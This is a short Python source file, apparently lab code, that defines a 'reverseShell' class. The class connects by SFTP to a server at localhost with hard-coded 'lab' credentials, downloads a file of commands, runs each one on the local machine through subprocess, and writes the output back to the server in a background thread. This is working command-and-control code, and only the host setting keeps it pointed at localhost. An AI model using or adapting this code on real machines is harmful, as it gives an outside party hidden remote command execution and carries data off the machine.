import paramiko
import subprocess
import traceback
import threading
import random
import time
class reverseShell:
    def __init__(self,  username: str,  currTime: str):
        self.currTime = currTime
        self.username = username
        self.host = "localhost"
        self.port = 2200
        self.processtime = random.randint(2, 4)
    
    def _reverseShell(self) -> None:
        #Connects to the SFTP Server, recieves a file of commands, runs the commands and logs the output into a file on the server
        try:
            transport = paramiko.Transport((self.host, self.port))
            transport.connect(None,  'lab','lab')
            sftp = paramiko.SFTPClient.from_transport(transport)
            filename = str(self.username) + self.currTime
            output = sftp.open("/home/lab/" + filename,  "w+")
            with sftp.open("/home/lab/inputFile",  "r") as f:
                for line in f:
                    command = line.rstrip()
                    time.sleep(self.processtime)
                    out = subprocess.check_output(command.split())
                    output.write(out)
        except Exception as e:
            print("*** Error: %s: %s" % (e.__class__,  e) )
            traceback.print_exc()
        
    def start(self) -> None:
        thread = threading.Thread(target=self._reverseShell)
        thread.start()
